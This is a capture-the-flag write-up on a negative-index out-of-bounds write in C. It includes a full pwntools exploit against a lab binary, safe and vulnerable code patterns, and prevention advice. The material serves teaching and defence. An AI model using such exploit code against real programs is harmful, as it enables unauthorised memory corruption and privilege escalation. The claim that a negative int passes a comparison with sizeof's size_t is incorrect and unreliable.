# Challenge 14: Negative Array Index

## Difficulty: Easy

## Vulnerability Type: Out-of-Bounds Write via Negative Index

## Description
The program has an array access vulnerability that doesn't properly validate negative indices, allowing write access to adjacent memory.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### The Bug
```c
int index;
if (index < sizeof(data_store)) {  // Only checks upper bound!
    data_store[index] = value;      // Negative index allowed!
}
```

Missing check: `index >= 0`

### Memory Layout
```
Lower addresses:
  [is_admin] (4 bytes)
  [padding]
  [data_store] (256 bytes)
Higher addresses
```

If `is_admin` is before `data_store` in memory, we can use negative index to write to it!

## Exploitation Strategy

### Step 1: Calculate Offset
The program helpfully prints:
```
Offset: <difference between is_admin and data_store>
```

If offset is negative (e.g., -264), `is_admin` is before `data_store`.

### Step 2: Write to is_admin
```python
# If is_admin is at data_store - 264:
negative_index = -264  # Or whatever the offset is

# Write non-zero value to is_admin
# Choose option 2 (Write)
# Index: -264
# Value: 1
```

### Step 3: Trigger Admin Check
Choose option 3 to check admin status.

### Complete Exploit
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./challenge')
context.binary = elf

if args.REMOTE:
    p = remote('localhost', 9014)
else:
    p = process('./challenge')

# Get offset
p.recvuntil(b'Offset: ')
offset = int(p.recvline().strip())
log.info(f"Offset: {offset}")

# If offset is positive, is_admin is AFTER data_store
# If offset is negative, is_admin is BEFORE data_store

# For negative offset, we use it directly as array index
if offset < 0:
    target_index = offset
else:
    # If positive, we would overflow forward
    # But typically in this challenge, is_admin is before
    target_index = -offset

log.info(f"Using index: {target_index}")

# Write to is_admin
p.sendlineafter(b'Choice: ', b'2')  # Write option
p.sendlineafter(b'Index: ', str(target_index).encode())
p.sendlineafter(b'Value', b'1')     # Set to non-zero

# Check admin
p.sendlineafter(b'Choice: ', b'3')

p.interactive()
```

### Manual Exploitation
```
1. Run the program
2. Note the offset (e.g., -264)
3. Choose option 2 (Write)
4. Enter index: -264
5. Enter value: 1
6. Choose option 3 (Check admin)
7. Get flag!
```

## Automated Detection
- **Array Access**: Program uses array indexing
- **Incomplete Validation**: Upper bound check only, no lower bound
- **Signed Index**: Index variable is signed int
- **Adjacent Data**: Sensitive variable near array in memory
- **Strategy**: Calculate negative offset, write to target variable

## Common Patterns

### Vulnerable
```c
// Missing lower bound check
if (idx < ARRAY_SIZE) {
    array[idx] = val;
}

// Signed comparison with unsigned size
if (idx < sizeof(array)) {  // idx is int, sizeof returns size_t
    array[idx] = val;        // If idx is negative, still passes!
}
```

### Safe
```c
// Proper bounds checking
if (idx >= 0 && idx < ARRAY_SIZE) {
    array[idx] = val;
}

// Or use unsigned index
unsigned int idx;
if (idx < ARRAY_SIZE) {  // Negative not possible
    array[idx] = val;
}
```

## Real-World Impact

This class of bugs appears in:
- Array/buffer implementations
- Packet parsers (negative offsets)
- File format parsers
- Scripting language interpreters

Examples:
- Heartbleed (CVE-2014-0160): Similar OOB read
- Many JavaScript engine bugs
- PHP array handling bugs

## Learning Objectives
- Importance of complete bounds checking
- Signed vs unsigned comparisons
- Memory layout understanding
- Arbitrary write primitives
- Data-only attacks (no code execution needed)

## Variations

### Positive Overflow
If `is_admin` is AFTER `data_store`:
```c
int index = 260;  // Beyond array
data_store[260] = 1;  // Writes to is_admin
```

### Calculation Overflow
```c
// index is validated, but calculation isn't
if (index < SIZE) {
    array[index * element_size] = val;  // Overflow in multiplication
}
```

## Prevention Techniques
1. Always check both bounds: `0 <= index < size`
2. Use unsigned types for indices
3. Use safe array access functions
4. Enable compiler warnings: `-Warray-bounds`
5. Use static analysis tools
6. Memory safety languages (Rust, etc.)
